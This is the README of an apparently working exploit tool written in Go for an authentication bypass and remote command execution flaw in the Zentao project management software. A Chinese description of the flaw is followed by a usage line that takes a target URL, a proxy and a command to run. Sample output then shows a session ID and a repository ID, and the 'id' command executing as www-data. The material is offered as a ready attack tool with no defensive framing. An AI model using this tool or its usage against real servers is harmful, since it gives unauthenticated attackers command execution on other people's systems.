# Zentao-Captcha-AuthBypass-RCE

> 禅道研发项目管理软件是国产的开源项目管理软件，专注研发项目管理，内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能，实现了软件的完整生命周期管理。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。

## USE

```bash
go run main.go -p http://127.0.0.1:8080 -c id -u http://example.com
```

```

####### #######  #####                                           ######   #####  #######
     #     #    #     #   ##   #####  #####  ####  #    #   ##   #     # #     # #
    #      #    #        #  #  #    #   #   #    # #    #  #  #  #     # #       #
   #       #    #       #    # #    #   #   #      ###### #    # ######  #       #####
  #        #    #       ###### #####    #   #      #    # ###### #   #   #       #
 #         #    #     # #    # #        #   #    # #    # #    # #    #  #     # #
#######    #     #####  #    # #        #    ####  #    # #    # #     #  #####  #######

[INFO] Target URL: http://example.com
[INFO] Proxy: http://127.0.0.1:8080
[INFO] Zentao Web根路径: http://example.com
[INFO] requestType: PATH_INFO
[INFO] zentaosid: 4cc98u18fevc4a8kbsmrjv9dlq
[INFO] repoID: 30
[INFO] Command: id
[INFO] 命令执行结果: uid=33(www-data)
```

